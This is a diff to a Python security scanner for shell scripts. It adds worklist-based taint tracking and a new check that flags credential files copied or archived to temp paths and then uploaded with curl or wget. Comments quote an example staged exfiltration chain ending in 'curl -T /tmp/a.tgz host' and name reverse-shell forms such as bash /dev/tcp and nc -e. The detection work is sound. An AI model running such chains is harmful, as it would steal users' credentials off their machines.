@@ -19774,23 +19774,36 @@ def _sh_dns_cred_exfil_lines(masked: str) -> set:
     def _refs(text: str) -> set:
         return set(_SH_VAR_REF_RE.findall(text))
 
-    env_t: set = set()   # vars carrying a credential-shaped ENV VAR (no encoder needed)
-    file_t: set = set()  # vars whose value touches a credential FILE
-    enc_t: set = set()   # vars with an encoder somewhere in their derivation chain
-    changed = True
-    while changed:
-        changed = False
-        for var, val in assigns:
-            refs = _refs(val)
-            if (bool(_SH_CRED_ENV_RE.search(val)) or (refs & env_t)) and var not in env_t:
-                env_t.add(var)
-                changed = True
-            if (bool(_SH_CRED_FILE_RE.search(val)) or (refs & file_t)) and var not in file_t:
-                file_t.add(var)
-                changed = True
-            if (bool(_SH_ENCODER_RE.search(val)) or (refs & enc_t)) and var not in enc_t:
-                enc_t.add(var)
-                changed = True
+    # Three taint sets propagated by a WORKLIST over the variable-dependency graph: linear
+    # in (assignments + reference edges), so it needs no pass cap (which would fail-OPEN by
+    # silently under-tainting) and cannot run away (the DoS the pass cap guarded against).
+    # Monotonic: a set only grows, and an item is re-queued only when a var it references
+    # gained taint, so it terminates. env = carries a credential-shaped ENV VAR (needs no
+    # encoder); file = touches a credential FILE; enc = an encoder in the derivation chain.
+    items = [(var, val, _refs(val)) for var, val in assigns]
+    dependents: dict = {}
+    for i, (_var, _val, refs) in enumerate(items):
+        for r in refs:
+            dependents.setdefault(r, set()).add(i)
+    env_t: set = set()
+    file_t: set = set()
+    enc_t: set = set()
+    work = set(range(len(items)))
+    while work:
+        i = work.pop()
+        var, val, refs = items[i]
+        grew = False
+        if var not in env_t and (_SH_CRED_ENV_RE.search(val) or (refs & env_t)):
+            env_t.add(var)
+            grew = True
+        if var not in file_t and (_SH_CRED_FILE_RE.search(val) or (refs & file_t)):
+            file_t.add(var)
+            grew = True
+        if var not in enc_t and (_SH_ENCODER_RE.search(val) or (refs & enc_t)):
+            enc_t.add(var)
+            grew = True
+        if grew:
+            work |= dependents.get(var, set())
     ready = env_t | (file_t & enc_t)
 
     def _dns_arg_texts(raw: str) -> list:
@@ -19828,6 +19841,116 @@ def _sh_dns_cred_exfil_lines(masked: str) -> set:
                 or (has_cred_file and has_encoder)
                 or (ready and (arg_refs & ready))
             ):
+                hits.add(i)
+                break
+    return hits
+
+
+# B-1066: staged temp-file laundering. A credential file is copied/archived into an
+# intermediate file, then THAT file is uploaded -- the upload command references only the
+# temp path, so the credential->upload data flow is broken (`cp cred /tmp/x; tar czf
+# /tmp/a.tgz /tmp/x; curl -T /tmp/a.tgz host`). Taint flows across copy/archive commands:
+# a cp/mv/rsync/tar/zip/... that touches a credential file (or an already-tainted path)
+# taints its output paths, to a fixpoint; an outbound curl/wget that uploads a tainted
+# path is then flagged. Ambiguous (a config BACKUP to the user's own service has the same
+# shape) -> WARN, never FAIL. Redirect-based laundering (`cat cred > x`) is a known gap:
+# shellwords cannot parse a redirection, so that line is skipped.
+_SH_COPY_ARCHIVE_CMDS = frozenset({
+    "cp", "mv", "install", "rsync", "tar", "zip", "gzip", "bzip2", "xz", "zstd",
+    "7z", "7za", "cpio", "pax",
+})
+
+
+def _sh_cmd_name_index(words: list) -> "int | None":
+    """Index of the command NAME word, skipping a leading `do`/`then`, `VAR=val`
+    env-prefixes and one `sudo`. None if no name word remains."""
+    idx = 0
+    if idx < len(words) and words[idx] in ("do", "then") and idx + 1 < len(words):
+        idx += 1
+    while idx < len(words) and _SH_ENV_PREFIX_ASSIGN_RE.match(words[idx]):
+        idx += 1
+    if idx < len(words) and words[idx] == "sudo" and idx + 1 < len(words):
+        idx += 1
+    return idx if idx < len(words) else None
+
+
+def _sh_path_candidates(word: str) -> set:
+    """Candidate file-path strings inside one shell word, for taint matching: the bare
+    word, the piece after a `@` (curl `-F f=@PATH`, `-d @PATH`), and the piece after a `=`
+    (wget `--post-file=PATH`). Surrounding quote characters are stripped (shellwords keeps
+    them in `.text`). Flags and URLs are dropped."""
+    word = word.strip("\"'`")
+    cands = {word}
+    if "@" in word:
+        cands.add(word.rsplit("@", 1)[-1].strip("\"'`"))
+    if "=" in word:
+        cands.add(word.rsplit("=", 1)[-1].strip("\"'`"))
+    return {c for c in cands if c and not c.startswith("-") and "://" not in c}
+
+
+def _sh_staged_cred_upload_lines(masked: str) -> set:
+    """B-1066: physical line numbers where a curl/wget uploads a file whose content was
+    derived from a credential file through an intermediate copy/archive (temp-file
+    laundering). Emitted at ``info`` severity -> WARN (warns_env_exfil).
+
+    Taint is propagated by a WORKLIST over the copy/archive commands (linear in commands
+    plus path-reference edges): a command taints its path args when it has a literal
+    credential-file arg or any of its path args is already tainted. No pass cap -- a cap
+    would fail-OPEN by silently under-tainting a deep chain -- and the worklist is
+    monotonic, so it cannot run away."""
+    def _copy_paths(word: str) -> str:
+        w = word.strip("\"'`")
+        w = w[1:] if w.startswith("@") else w
+        if not w or w.startswith("-") or "://" in w:
+            return ""
+        return w
+
+    line_cmds = [_shellwords.scan_line(raw) for raw in masked.splitlines()]
+
+    # One record per copy/archive command: its path args and whether it reads a literal
+    # credential file. `dependents[path]` = command indices that name that path.
+    copy_cmds: list = []
+    dependents: dict = {}
+    for cmds in line_cmds:
+        if not cmds:
+            continue
+        for c in cmds:
+            words = [w.text for w in c.words]
+            ci = _sh_cmd_name_index(words)
+            if ci is None or words[ci].rsplit("/", 1)[-1] not in _SH_COPY_ARCHIVE_CMDS:
+                continue
+            args = words[ci + 1:]
+            paths = {p for p in (_copy_paths(a) for a in args) if p}
+            has_cred = any(_SH_CRED_FILE_RE.search(a) for a in args)
+            idx = len(copy_cmds)
+            copy_cmds.append((paths, has_cred))
+            for p in paths:
+                dependents.setdefault(p, set()).add(idx)
+
+    tainted: set = set()  # literal file-path strings holding cred-derived content
+    work = set(range(len(copy_cmds)))
+    while work:
+        idx = work.pop()
+        paths, has_cred = copy_cmds[idx]
+        if not (has_cred or (paths & tainted)):
+            continue
+        for p in paths:
+            if p not in tainted:
+                tainted.add(p)
+                work |= dependents.get(p, set())
+
+    hits: set = set()
+    if not tainted:
+        return hits
+    for i, (raw, cmds) in enumerate(zip(masked.splitlines(), line_cmds), 1):
+        if cmds is None or not _SH_OUTBOUND_RE.search(raw):
+            continue
+        for c in cmds:
+            words = [w.text for w in c.words]
+            ci = _sh_cmd_name_index(words)
+            if ci is None or words[ci].rsplit("/", 1)[-1] not in _CURL_WGET_PROGRAMS:
+                continue
+            if any(_sh_path_candidates(w) & tainted for w in words[ci + 1:]):
                 hits.add(i)
                 break
     return hits
@@ -19944,6 +20067,18 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
             "an encoded credential is placed in a DNS lookup's query name "
             "(dig/nslookup/host) \u2014 possible DNS-tunnel exfiltration; confirm the queried "
             "name is not carrying secret data off-box",
+        )
+
+    # B-1066: a credential file laundered through a temp copy/archive and then uploaded
+    # (cp cred /tmp/x; tar czf /tmp/a.tgz /tmp/x; curl -T /tmp/a.tgz host). "info" -> WARN.
+    for i in sorted(_sh_staged_cred_upload_lines(masked)):
+        add(
+            "SHELL_STAGED_CRED_UPLOAD",
+            "info",
+            i,
+            "uploads a file whose content was copied/archived from a credential file "
+            "earlier in this script \u2014 possible staged exfiltration; confirm the "
+            "destination is a trusted first-party backup, not an attacker-controlled host",
         )
 
     # C-630: plaintext reverse shell (bash /dev/tcp, nc -e, socat exec:, fd-bound shell).
